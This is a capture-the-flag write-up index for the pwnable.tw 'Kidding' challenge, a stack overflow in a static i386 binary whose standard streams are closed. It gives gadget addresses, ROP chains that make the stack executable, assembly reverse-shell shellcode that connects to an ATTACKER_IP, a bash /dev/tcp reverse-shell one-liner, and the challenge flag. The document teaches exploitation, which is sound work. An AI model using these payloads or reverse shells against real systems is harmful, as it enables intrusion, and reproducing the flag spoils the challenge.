---
tags:
  - stack-buffer-overflow
  - rop
  - seccomp-bypass
  - reverse-shell
platform: pwnable.tw
points: 300
arch: i386
libc: static
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A stack buffer overflow in a static binary with closed standard streams is exploited by constructing a ROP chain to create a reverse socket connection."
proof-of-concept: no
---

# Kidding — pwnable.tw (300 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10303`
>
> Flag: `FLAG{Ar3_y0u_k1dd1ng_m3}`

## Challenge Overview

A statically linked i386 binary with a trivial stack buffer overflow — but with a cruel twist: `main()` calls `close(0); close(1); close(2)` **before returning**, destroying all standard I/O file descriptors. After hijacking the return address, there is no stdin/stdout/stderr and no second read — everything must fit in the initial `read(0, buf, 0x64)` of 100 bytes.

The flag is not directly `cat`-able: `/home/flag/I_am_fl4g` is owned by user `flag`, and a setuid helper `/home/flag/get_flag` must be invoked interactively (`echo ./I_am_fl4g | ./get_flag`).

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
  Type:     Statically linked
```

## Vulnerability

### V1 — Stack Buffer Overflow (12-byte overflow to saved EIP)

**Root Cause:** `main()` reads up to `0x64` (100) bytes into an 8-byte stack buffer at `ebp-8`, providing a 12-byte distance to the saved return address and ~88 bytes of ROP/shellcode space after it.

```asm
; main (simplified)
sub    esp, 0x10           ; allocate 16 bytes (buf at ebp-8)
push   0x64                ; count = 100
lea    eax, [ebp-0x8]      ; buf
push   eax
push   0x0                 ; fd = stdin
call   read                ; read(0, ebp-8, 0x64)

; ... close(0); close(1); close(2); ...
leave
ret                        ; hijacked return address
```

**Layout:**

```
[ebp-8]  buf (8 bytes)
[ebp]    saved EBP (4 bytes)  ← 12 bytes padding total
[ebp+4]  saved EIP            ← overflow target
[ebp+8]  ... ~88 bytes of ROP + shellcode space
```

**Constraint:** After `main` closes all three file descriptors, the program has **no I/O**. The exploit must establish a new communication channel (reverse TCP shell) entirely from this single 100-byte payload.

## Key Symbols (No PIE, statically linked)

| Symbol | Address | Purpose |
|--------|---------|---------|
| `__stack_prot` | `0x080e9fec` | Runtime stack protection flags (set to 7 = RWX) |
| `__libc_stack_end` | `0x080e9fc8` | Pointer to stack end (passed to `_dl_make_stack_executable`) |
| `_dl_make_stack_executable` | `0x0809a080` | Calls `mprotect` to make the stack executable |
| `_dl_make_stack_executable_hook` | `0x080ea9f4` | Function pointer, can be incremented to invoke the above |
| `mprotect` | `0x0806dd40` | Direct `mprotect` syscall wrapper |
| `jmp esp` | `0x080bd13b` | Gadget to jump to shellcode placed after the ROP chain |
| `push esp; ret` | `0x080b8546` | Alternative to `jmp esp` |

## Exploit Paths

All solutions share the same overall structure: **make the stack executable → `jmp esp` → reverse-shell shellcode**. They diverge in how they make the stack executable and how they handle the closed-fd I/O problem.

---

### Path A — `_dl_make_stack_executable` + `jmp esp` + Reverse Shell (Most Common)

**Used by:** ~80% of solutions (8, 59, 81, 186, 278, 370, 550, 821, 1074, 1351, 1986, 3498, 6247, 7905, 10128, 21778, 29544, 35463, exp.py)

**ROP Chain (36 bytes):**

```python
# Set __stack_prot = 7 (PROT_READ | PROT_WRITE | PROT_EXEC)
rop  = p32(POP_EDX) + p32(__stack_prot)
rop += p32(POP_EAX) + p32(7)
rop += p32(MOV_PTR_EDX_EAX)          # [__stack_prot] = 7
# Call _dl_make_stack_executable(&__libc_stack_end)
rop += p32(POP_EAX) + p32(__libc_stack_end)
rop += p32(_dl_make_stack_executable)
rop += p32(JMP_ESP)                   # jump into shellcode below
```

**Stage-1 Shellcode (~52 bytes, on the now-executable stack):**

Since fd 0/1/2 are closed, `socket()` returns fd 0 (the lowest available). The shellcode:
1. `socket(AF_INET, SOCK_STREAM, 0)` → returns fd 0
2. `connect(0, {attacker_ip, attacker_port}, 16)` → establishes reverse TCP connection
3. Either:
   - `read(0, esp, large_size)` → reads stage-2 shellcode from the socket, then `jmp esp` / `call ecx` into it
   - `execve("/bin/sh", NULL, NULL)` directly (shell gets stdin from socket on fd 0, but no stdout)

```asm
; Typical stage-1: socket + connect + read stage-2
push 0x66          ; sys_socketcall
pop  eax
push 0x1           ; SYS_SOCKET
pop  ebx
xor  edx, edx
push edx           ; protocol = 0
push ebx           ; SOCK_STREAM = 1
push 0x2           ; AF_INET = 2
mov  ecx, esp
int  0x80          ; socket() → fd 0

mov  al, 0x66      ; sys_socketcall
push ATTACKER_IP   ; sin_addr (network order)
push PORT_AND_AF   ; sin_port (BE) + AF_INET
mov  ecx, esp
push 0x10          ; addrlen = 16
push ecx           ; sockaddr *
push edx           ; sockfd = 0
mov  ecx, esp
inc  ebx           ; ebx = 3 = SYS_CONNECT
int  0x80          ; connect()

mov  al, 0x3       ; sys_read
xor  ebx, ebx      ; fd = 0
mov  ecx, esp       ; buf = stack
mov  dl, 0x40       ; count
int  0x80           ; read stage-2
jmp  ecx            ; execute stage-2
```

**Stage-2 Shellcode (sent over the socket):**

```asm
; dup2(0, 1); dup2(0, 2); execve("/bin/sh", NULL, NULL)
push 0x3f; pop eax; xor ebx, ebx; push 1; pop ecx; int 0x80  ; dup2(0, 1)
push 0x3f; pop eax; xor ebx, ebx; push 2; pop ecx; int 0x80  ; dup2(0, 2)
xor eax, eax; push eax
push 0x68732f2f; push 0x6e69622f  ; "//sh", "/bin"
mov ebx, esp; xor ecx, ecx; cdq
mov al, 0xb; int 0x80              ; execve("/bin/sh")
```

**Variants within Path A:**

- **Single-stage execve (no dup2):** Some solutions skip the stage-2 read and call `execve("/bin/sh")` directly after `connect`. The shell has stdin from the socket (fd 0) but no stdout. They then use `bash -c "bash -i >& /dev/tcp/attacker/port2 0>&1"` from inside the first shell to spawn a second reverse shell with full I/O.
- **Two separate listeners:** One port for the initial connect-back, another port for a `bash` reverse shell spawned from inside the first.
- **`push ebp` for "/bin":** Some solutions store `/bin` in `ebp` at overflow time (overwriting saved EBP) and use `push ebp` in shellcode to build the `/bin/sh` string, saving bytes.
- **Bore/ngrok tunnel:** For NAT-ed attackers, some use `bore.pub` or `ngrok` to expose a local port to the internet.

---

### Path B — `mprotect` Directly + Reverse Shell

**Used by:** Solutions 14, 81, 363, 664, 1074 (variant)

Instead of `_dl_make_stack_executable`, these solutions call `mprotect` directly on a BSS or stack page. This uses more ROP bytes but avoids the `__stack_prot` / `__libc_stack_end` setup.

```python
# mprotect(addr, 0x1000, 7)
rop  = p32(mprotect_addr)
rop += p32(POP3_RET)         # pop ebx; pop esi; pop edi; ret
rop += p32(page_addr)        # addr (BSS or stack page)
rop += p32(0x1000)           # len
rop += p32(7)                # prot = RWX
# ... pivot or jmp to shellcode
```

Some solutions `mprotect` a BSS page, copy shellcode there via `strcpy`/`memcpy`/`rep movsd`, then jump to it. This avoids needing to know the exact stack address but costs more ROP gadgets, making the payload tighter.

---

### Path C — Pure ROP (No Shellcode)

**Used by:** Solutions 14 (stage-2), 1074 (server-side)

Instead of making the stack executable, some solutions perform the entire `socket → connect → read` sequence via ROP gadgets only (no shellcode execution needed for stage-1). The stage-2 payload sent over the socket then uses a ROP chain to call `dup2` and `execve`.

This approach is much more constrained in the 100-byte budget — solution 14 uses extremely compressed ROP with computed register values and `stosd` gadgets to build the sockaddr struct at runtime.

---

### Path D — `_dl_make_stack_executable_hook` Increment

**Used by:** Solutions 13204, 21778

Instead of writing 7 to `__stack_prot` and calling `_dl_make_stack_executable` directly, these solutions:
1. Set `ebp` to `__libc_stack_end - 0x18` (so `_dl_make_stack_executable` reads the right value)
2. Increment `_dl_make_stack_executable_hook` to point to the actual function
3. Call through the hook

This saves a few bytes by using `inc dword ptr [ecx]; ret` instead of the `pop edx; pop eax; mov [edx], eax; ret` sequence.

```python
rop += p32(POP_ECX) + p32(_dl_make_stack_executable_hook)
rop += p32(INC_DWORD_ECX)     # increment the hook pointer
rop += p32(0x080937f0)        # call through the hook
rop += p32(JMP_ESP)
```

---

### Path E — `sys_socket`/`sys_connect` via Direct `int 0x80` Syscalls in ROP

**Used by:** Solution 35463

Uses the newer Linux syscall numbers (`sys_socket` = 0x167, `sys_connect` = 0x16a) instead of the multiplexed `sys_socketcall` (0x66). This avoids the nested argument pointer setup needed by `socketcall` and can be slightly more compact.

## Exploit Primitive Summary

| Primitive | Technique | Bytes |
|-----------|-----------|-------|
| Stack executable | `_dl_make_stack_executable` | ~36 bytes ROP |
| Stack executable | Direct `mprotect` call | ~24-32 bytes ROP |
| Stack executable | Hook increment trick | ~28 bytes ROP |
| Reverse TCP (stage-1) | `socketcall(socket)` + `socketcall(connect)` + `read` | ~48-52 bytes shellcode |
| Reverse TCP (stage-1) | `sys_socket` + `sys_connect` + `read` (direct syscalls) | ~40-48 bytes shellcode |
| Full shell (stage-2) | `dup2(0,1)` + `dup2(0,2)` + `execve("/bin/sh")` | ~30-40 bytes shellcode |
| Full shell (no stage-2) | `execve("/bin/sh")` + bash reverse shell from inside | Single stage but needs 2 listeners |

## Offsets (Static Binary, No PIE)

```python
# ROP gadgets
POP_EAX        = 0x080b8536   # pop eax; ret
POP_EDX        = 0x0806ec8b   # pop edx; ret
POP_ECX        = 0x080583c9   # pop ecx; ret
MOV_PTR_EDX    = 0x0805462b   # mov dword ptr [edx], eax; ret
JMP_ESP        = 0x080bd13b   # jmp esp
PUSH_ESP_RET   = 0x080b8546   # push esp; ret

# Key symbols
__stack_prot                 = 0x080e9fec
__libc_stack_end             = 0x080e9fc8
_dl_make_stack_executable    = 0x0809a080
_dl_make_stack_executable_hook = 0x080ea9f4
mprotect                     = 0x0806dd40

# Syscall
INT_0x80       = 0x0806c825   # int 0x80
SYSCALL        = 0x0806f290   # int 0x80; ret (alternative)
```

## Getting the Flag

The flag file `/home/flag/I_am_fl4g` is not world-readable. A setuid helper `/home/flag/get_flag` reads a path from stdin, compares it to `"./I_am_fl4g"`, and prints the flag:

```bash
cd /home/flag && echo ./I_am_fl4g | ./get_flag
# → "Here is your flag: FLAG{Ar3_y0u_k1dd1ng_m3}"
```

## Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `8.md` | A | `_dl_make_stack_executable` + 2-stage reverse shell | Clean two-script approach |
| `14.md` | C | Pure ROP socket+connect+read; stage-2 is ROP `execve` | No shellcode in stage-1 |
| `59.md` | A | `_dl_make_stack_executable` + reverse shell + bash 2nd shell | Uses `ebp` = `/bin` trick |
| `81.md` | A | `_dl_make_stack_executable` + stage-1+2 | Standard two-listener setup |
| `186.md` | A | `_dl_make_stack_executable` + single-stage `execve` | stdin-only reverse shell + bash for stdout |
| `278.md` | A (Ruby) | `or [eax-7], ebp` gadget to set `__stack_prot` | Unusual gadget choice; `exec >&0` for stdout |
| `363.md` | B | `mprotect` on BSS + `rep movsd` copy + reverse shell | Copies shellcode to BSS page |
| `370.md` | A | `_dl_make_stack_executable` + connect-back + return to main | Two-stage: stage-1 returns to main for 2nd payload |
| `550.md` | A | `_dl_make_stack_executable` + `dup2` + `connect` + `execve` | All in one stage, port 512 trick |
| `664.md` | B | `mprotect` on stack + socketcall via `stosd` gadget | Stores sockaddr at runtime via `stosd` |
| `821.md` | A | `_dl_make_stack_executable` + connect-back + `dup2(0,1)` via syscall 0x167/0x16a | Uses direct socket syscalls |
| `1074.md` | C + A | Stage-1: ROP `socket+connect+read`; stage-2: ROP chain with `dup2+execve` | Pure ROP both stages |
| `1351.md` | A | Standard `_dl_make_stack_executable` | Clean minimal script |
| `1986.md` | A | `_dl_make_stack_executable` + `read(esp)` + stage-2 | Two-stage, second reads via socket |
| `3498.md` | A | `_dl_make_stack_executable` + `pop dword [ecx]` gadget | Uses `pop dword [ecx]; ret` to write `__stack_prot` |
| `6247.md` | B | `mprotect` BSS + `strcpy` + `add esi, ecx; jmp ebx` pivot | Copies shellcode to BSS via strcpy chain |
| `7905.md` | A | Standard + `push esp; ret` variant | Clean two-file exploit |
| `10128.md` | A | `mov eax, 7` gadget + `push esp; ret` | Byte-saving `mov eax, 7` immediate |
| `13204.md` | D | `_dl_make_stack_executable_hook` increment | Saves ROP bytes via hook indirection |
| `21778.md` | D | Hook increment + `dup2` in stage-1 | Same hook trick, slightly different shellcode |
| `29544.md` | A | Standard + direct `sys_socket`/`sys_connect` syscalls | Uses newer syscall numbers |
| `35463.md` | E | `mprotect` + `sys_socket`/`sys_connect` direct syscalls | DNS resolve for tunnel hostname |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (stdlib sockets, bore tunnel) |
| `desc.txt` | Challenge description |
| `artifacts/` | Original challenge binary |
| `tools/` | Bore tunnel client binary |
| `solution/*.md` | Community write-ups (67 solutions) |
